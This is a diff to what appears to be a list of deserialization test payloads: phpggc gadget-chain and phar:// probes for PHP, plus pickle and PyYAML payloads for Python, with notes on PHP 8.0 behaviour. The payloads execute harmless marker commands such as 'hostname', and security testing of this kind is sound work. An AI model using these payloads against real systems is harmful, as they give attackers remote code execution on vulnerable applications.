@@ -112,12 +112,15 @@ phpggc Guzzle/FW1 /tmp/marker /tmp/local-file
 phpggc -p phar -o /tmp/marker.phar Monolog/RCE1 system 'hostname'
 phar://uploads/avatar.jpg/marker
 phar://./uploads/avatar.jpg
+# PHP before 8.0: filesystem functions (file_exists, is_dir, filesize, getimagesize and others) unserialize Phar metadata when given a phar:// path
 file_exists('phar://uploads/avatar.jpg')
 getimagesize('phar://uploads/avatar.jpg')
-# Phar metadata is unserialized by filesystem functions (file_exists, is_dir, filesize, getimagesize and others) when given a phar:// path
+# PHP 8.0 and later: metadata is unserialized only when read explicitly, so the two probes above give a negative result; test for these sinks instead
+(new Phar('phar://uploads/avatar.jpg'))->getMetadata()
+(new PharData('phar://uploads/archive.tar'))->getMetadata()
 
 # Python: pickle, PyYAML, jsonpickle, shelve, marshal and numpy/pandas loaders
-gASVJwAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMB21hcmtlcpSFlFKULg==
+gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMDXBpY2tsZS1tYXJrZXKUhZRSlC4=
 cposix\nsystem\n(S'hostname'\ntR.
 !!python/object/apply:os.system ["hostname"]
 !!python/object/new:os.system ["hostname"]
